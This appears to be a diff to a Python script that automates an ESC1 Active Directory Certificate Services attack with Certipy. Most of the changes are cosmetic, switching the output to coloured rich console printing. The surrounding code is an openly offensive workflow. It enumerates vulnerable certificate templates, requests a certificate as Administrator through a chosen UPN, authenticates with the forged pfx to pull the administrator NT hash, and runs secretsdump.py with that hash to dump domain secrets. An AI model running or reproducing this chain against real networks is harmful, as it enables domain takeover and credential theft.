@@ -7,7 +7,7 @@ from rich.panel import Panel
 console = Console()
 
 def run_certipy_find(user, password, target):
-    print("[+] Enumerating certificate templates...")
+    console.print("[+] Enumerating certificate templates...", style="bold green")
     command = [
         "certipy", "find",
         "-u", user,
@@ -25,7 +25,7 @@ def run_certipy_find(user, password, target):
 
 
 def parse_certipy_find_output(output):
-    print("[+] Parsing Certipy output...")
+    console. print("[+] Certipy Findings...", style="bold green")
     vulnerable_to = re.search(r"\[!\] Vulnerabilities\s+(.*)", output, re.S)
     template_name = re.search(r"Template Name\s+: (.+)", output)
     ca_name = re.search(r"CA Name\s+: (.+)", output)
@@ -49,7 +49,7 @@ def parse_certipy_find_output(output):
 
 
 def run_certipy_request(user, password, ca, template, upn, target, output_file):
-    print("[+] Requesting a certificate...")
+    console.print("[+] Requesting a certificate as Administrator...", style="bold cyan")
     command = [
         "certipy", "req",
         "-u", user,
@@ -57,7 +57,7 @@ def run_certipy_request(user, password, ca, template, upn, target, output_file):
         "-ca", ca,
         "-template", template,
         "-upn", upn,
-        "-target", target
+        "-target", target, "-debug"
     ]
     result = subprocess.run(command, capture_output=True, text=True)
     
@@ -71,7 +71,7 @@ def run_certipy_request(user, password, ca, template, upn, target, output_file):
     return output_file
 
 def run_certipy_auth(pfx_file, domain):
-    print("[+] Authenticating with the forged certificate...")
+    console.print("[+] Authenticating with the pfx file...", style="bold cyan")
     command = [
         "certipy", "auth",
         "-pfx", pfx_file,
@@ -92,7 +92,7 @@ def extract_nt_hash(certipy_output):
     match = re.search(r"Got hash for 'administrator@.+': ([a-f0-9]+):([a-f0-9]+)", certipy_output)
     if match:
         full_hash = f"{match.group(1)}:{match.group(2)}"
-        print(f"[*] Extracted NT Hash: {full_hash}")
+        console.print(f"[*] Extracted NT Hash: {full_hash}", style="bold cyan")
         return full_hash
     else:
         print("[!] NT hash not found in Certipy output.")
@@ -100,7 +100,7 @@ def extract_nt_hash(certipy_output):
 
 
 def run_secretsdump(user, ntlm_hash, target):
-    print(f"[+] Running secretsdump.py with NTLM hash: {ntlm_hash}")
+    console.print(f"[+] Running secretsdump.py with NTLM hash: {ntlm_hash}", style="bold red")
     command = [
         "secretsdump.py",
         f"{user}@{target}",
@@ -115,15 +115,15 @@ def run_secretsdump(user, ntlm_hash, target):
             if output == "" and process.poll() is not None:
                 break
             if output:
-                console.print(output.strip(), style="red")  # Print output in green text
+                console.print(output.strip(), style="bold cyan")  
 
         stderr_output = process.stderr.read()
         if process.returncode != 0:
-            console.print(f"[!] Error running secretsdump.py: {stderr_output.strip()}", style="red")  # Error in red
+            console.print(f"[!] Error running secretsdump.py: {stderr_output.strip()}", style="bold cyan")  
         else:
-            console.print("[+] secretsdump.py completed successfully.", style="green")  # Success in green
+            console.print("[+] secretsdump.py completed successfully.", style="bold red")  
     except Exception as e:
-        console.print(f"[!] Exception occurred: {e}", style="red")  # Exception in red
+        console.print(f"[!] Exception occurred: {e}", style="red")  
 
 def main():
     parser = argparse.ArgumentParser(description="ESC1 exploitation using Certipy in no time : D")
@@ -158,6 +158,7 @@ def main():
         return
 
     run_secretsdump("Administrator", nt_hash, target)
+
 
 if __name__ == "__main__":
     main()
